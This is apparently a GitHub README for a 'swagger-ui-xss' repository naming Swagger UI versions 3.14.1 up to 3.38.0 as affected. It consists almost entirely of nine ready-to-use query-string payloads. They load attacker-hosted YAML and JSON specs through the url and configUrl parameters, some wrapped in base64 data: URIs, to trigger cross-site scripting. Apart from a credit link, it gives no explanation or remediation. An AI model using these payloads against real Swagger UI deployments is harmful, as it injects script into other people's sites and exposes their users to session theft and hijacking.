# swagger-ui-xss
Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`

## Payload

1. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-domain.yaml`
2. `?url=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-fetch.yaml`
3. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/config.json`
4. `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
5. `/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
6. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-fetch2.yaml`
7. `?configUrl=https://ablush-dresses.000webhostapp.com/test.json`
8. `?url=https://ablush-dresses.000webhostapp.com/test.yaml`
9. `?url=https://ablush-dresses.000webhostapp.com/fetch.yaml`



Thanks to: https://github.com/VictorNS69/swagger-ui-xss/
